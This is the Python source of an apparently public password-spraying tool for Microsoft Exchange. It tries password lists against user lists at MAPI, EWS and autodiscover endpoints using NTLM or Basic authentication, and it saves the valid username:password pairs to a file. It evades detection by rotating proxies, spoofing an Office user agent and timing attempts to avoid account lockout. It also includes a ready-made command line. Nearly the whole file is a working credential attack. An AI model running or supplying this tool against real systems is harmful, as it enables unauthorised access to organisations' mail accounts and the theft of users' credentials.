import argparse
from termcolor import colored
import logging
import queue
import threading
import os
import requests
from requests_ntlm import HttpNtlmAuth
import sys
import time
from urllib.parse import urlparse
import base64
import random
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

############################ Internal VARS ############################
ARG_PARSER = None
AUTH_URL = None
DELAY = 1800
MAX_THREADS = 1
VERBOSE = False
JOB_QUEUE = None
CH = None
LOGGER = logging.getLogger('log')
LOGGER.setLevel(logging.INFO)
LOGGING_ENABLED = False
TIMEOUT = 30
VALID_ACCOUNTS = []
PROXY_LIST = None

AUTH_TYPE = 'NTLM'
USER_AGENT = 'Microsoft Office/16.0 (Windows NT 10.0; MAPI 16.0.9001; Pro)'


############################ AUTH URLs sample ############################

# https://webmail.example.org/mapi/
# https://webmail.example.org/EWS/Exchange.asmx
# https://mail.example.org/autodiscover/autodiscover.xml
# https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml
# https://autodiscover-s.outlook.com/EWS/Exchange.asmx

# python3 exchange_password_spray.py -U userlist.txt -P password.txt --url https://webmail.example.org/EWS/Exchange.asmx --delay 62 -T 1 -ua "Microsoft Office/16.0 (Windows NT 10.0; MAPI 16.0.9001; Pro)" -O result.txt -v

def generate_argparser():
    ascii_logo = """
    MS Exchange Password Spray Tool
    """
    ap = argparse.ArgumentParser(ascii_logo)

    ap.add_argument("-U", "--user-list", action='store', type=str,
                    help="Users list file path")

    ap.add_argument("-P", "--password-list", action='store', type=str, default=None,
                    help="Password list file path")

    ap.add_argument("-p", "--password", action='store', type=str, default=None,
                    help="Authenticate using a single password.")

    ap.add_argument("-D", "--domain", action='store', type=str,
                    help="Exchange WEB domain name. ex: webmail.example.org")

    ap.add_argument("--url", action='store', type=str,
                    help="Use explicit Authentication URL. ex: https://mail.example.org/autodiscover/autodiscover.xml")

    ap.add_argument("--delay", action='store', type=int, default=30,
                    help="Delay between authentication attempts in minutes, default is 30 minutes.")

    ap.add_argument("-T", "--threads", action='store', type=int, default=1,
                    help="Max number of concurrent threads, default is 1 thread.")

    ap.add_argument("-ua", "--useragent", action='store', type=str, default=None,
                    help="Use custom User-Agent.")

    ap.add_argument("-O", "--output", action='store', type=str,
                    help="Where to store valid logins.")

    ap.add_argument("-v", "--verbose", action='store_true', default=False,
                    help="Show more information while processing.")

    ap.add_argument("--version", action="version", version='MS Exchange Password Spray tool version 1.0  https://github.com/iomoath/PyExchangePasswordSpray')
    return ap


def read_proxy():
    global PROXY_LIST

    try:
        with open('proxy.txt') as f:
            lines = [line.rstrip() for line in f]

            if lines is None or not lines:
                PROXY_LIST = []
            else:
                PROXY_LIST = lines
    except:
        PROXY_LIST = []


def get_random_proxy():
    global PROXY_LIST

    if PROXY_LIST is None or not PROXY_LIST:
        return None

    proxy = random.choice(PROXY_LIST)
    return {"http": proxy, "https": proxy}


def init_job_queue(args):
    global JOB_QUEUE
    global MAX_THREADS
    JOB_QUEUE = queue.Queue()
    password_list = []

    with open(args["user_list"].strip()) as f:
        user_list = [line.rstrip('\n') for line in f]

    password_list_path = args['password_list'].strip()
    if password_list_path is not None and os.path.isfile(password_list_path):
        with open(args["password_list"].strip()) as f:
            password_list = [line.rstrip('\n') for line in f]
    elif args['password_list'].strip() is not None:
        password_list.append(args['password_list'].strip())

    for i in range(MAX_THREADS):
        for password in password_list:
            password = password.strip()
            job = {'users': user_list, 'password': password}
            JOB_QUEUE.put(job)

    base_domain = urlparse(AUTH_URL).netloc
    print(colored(
        '[*] Attempting {} password against {} user on {}'.format(len(password_list), len(user_list), base_domain),
        'yellow'))


def encode_to_base64(text):
    message_bytes = text.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    return base64_bytes.decode('ascii')


def get_auth_type(proxy=None):
    global AUTH_URL

    headers = {'User-Agent': USER_AGENT,
               'Connection': 'Close',
               'Accept-Encoding': 'gzip, deflate, br',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}

    try:
        session = requests.Session()
        result = session.get(AUTH_URL, headers=headers, verify=True, proxies=proxy)

        if result is None or result.headers is None or not result.headers:
            if '.xml' in AUTH_URL:
                return 'Basic'
            return 'NTLM'

        if 'WWW-Authenticate' in result.headers and 'basic realm' in result.headers['WWW-Authenticate'].lower():
            return 'Basic'

        if 'WWW-Authenticate' in result.headers and (
                result.headers['WWW-Authenticate'].lower() == 'ntlm' or result.headers[
            'WWW-Authenticate'].lower() == 'negotiate'):
            return 'NTLM'

        return 'NTLM'
    except Exception as e:
        print(colored('get_auth_type() {}'.format(e), 'red'))


def init(args):
    global MAX_THREADS
    global LOGGING_ENABLED
    global CH
    global DELAY
    global VERBOSE
    global USER_AGENT
    global AUTH_URL
    global ARG_PARSER
    global AUTH_TYPE

    try:
        read_proxy()

        MAX_THREADS = args['threads']
        DELAY = args['delay']

        VERBOSE = args['verbose']

        if args['useragent'] is not None and len(args['useragent'].strip()) > 0:
            USER_AGENT = args['useragent'].strip()

        auth_domain = args['domain']
        auth_url = args['url']

        if auth_url is not None and len(auth_url) > 1:
            AUTH_URL = auth_url.strip().rstrip('/')

        elif auth_domain is not None and len(auth_domain) > 1:
            if auth_domain.startswith('http://') or auth_domain.startswith('https://'):
                AUTH_URL = '{}/mapi/'.format(auth_domain)
            else:
                AUTH_URL = 'https://{}/mapi/'.format(auth_domain)
        else:
            print(colored('Invalid domain name or auth URL', 'red'))
            ARG_PARSER.print_help()
            sys.exit(0)

        output_path = args['output'].strip()
        if output_path is not None:
            CH = logging.FileHandler(output_path)
            CH.setFormatter(logging.Formatter('%(message)s'))
            LOGGER.addHandler(CH)
            LOGGING_ENABLED = True

        AUTH_TYPE = get_auth_type(get_random_proxy())

    except Exception as e:
        print(colored(e, 'red'))
        ARG_PARSER.print_help()
        sys.exit(0)

    init_job_queue(args)
    time.sleep(3)


def log_success_login(username, password):
    global LOGGER
    global LOGGING_ENABLED

    if not LOGGING_ENABLED:
        return

    msg = '{}:{}'.format(username, password)
    LOGGER.info(msg)


def print_verbose(msg, color):
    global VERBOSE

    if not VERBOSE:
        return

    if color is None:
        print(msg)
    else:
        print(colored(msg, color))


def process(username, password, proxy=None):
    global AUTH_URL
    global VALID_ACCOUNTS
    global AUTH_TYPE

    headers = {'User-Agent': USER_AGENT,
               'Connection': 'Close',
               'Accept-Encoding': 'gzip, deflate, br',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}

    session = requests.Session()

    if AUTH_TYPE == 'Basic':
        auth = "{}:{}".format(username, password)
        headers['Authorization'] = 'Basic {}'.format(encode_to_base64(auth))
    else:
        session.auth = HttpNtlmAuth(username=username, password=password)

    result = session.get(AUTH_URL, headers=headers, verify=True, proxies=proxy)
    is_valid = False

    if result is not None and (result.status_code == 200 or result.status_code == 500):
        if result.status_code == 200:
            if '<Autodiscover>' in result.text or '<Message>Invalid Request</Message>' in result.text or '/EWS/Services.wsdl' in result.text or 'Web.Config Configuration File' in result.text:
                is_valid = True
        elif result.status_code == 500:
            is_valid = True

    if is_valid:
        VALID_ACCOUNTS.append(username)
        print(colored('[+] Success: {}:{}'.format(username, password), 'green'))
        log_success_login(username, password)
    else:
        msg = "[!] Failed: {}:{}".format(username, password)
        print_verbose(msg, 'yellow')


def worker():
    global JOB_QUEUE
    global DELAY
    global TIMEOUT
    global VALID_ACCOUNTS

    thread = threading.Thread()
    while not JOB_QUEUE.empty():
        try:
            job = JOB_QUEUE.get()
            if job is None:
                break
        except Exception as e:
            print_verbose('[-] ERROR: {}'.format(e), 'red')
            continue

        user_list = job['users']
        password = job['password']

        for user in user_list:
            try:
                if user in VALID_ACCOUNTS:
                    continue

                process(user, password, get_random_proxy())

            except Exception as e:
                msg = "[-] ERROR: '{}:{}'. {}".format(user, password, e)
                print_verbose(msg, "red")

        if not JOB_QUEUE.empty():
            print(
                colored('[*] "{}" Pausing for {} minutes to avoid account lockout'.format(thread.name, DELAY), 'white'))
            seconds = DELAY * 60
            time.sleep(seconds)


def run(args):
    global MAX_THREADS

    init(args)

    # start worker threads
    for i in range(MAX_THREADS):
        threading.Thread(target=worker).start()


def main():
    global ARG_PARSER
    ARG_PARSER = generate_argparser()
    args = vars(ARG_PARSER.parse_args())
    run(args)


if __name__ == "__main__":
    main()
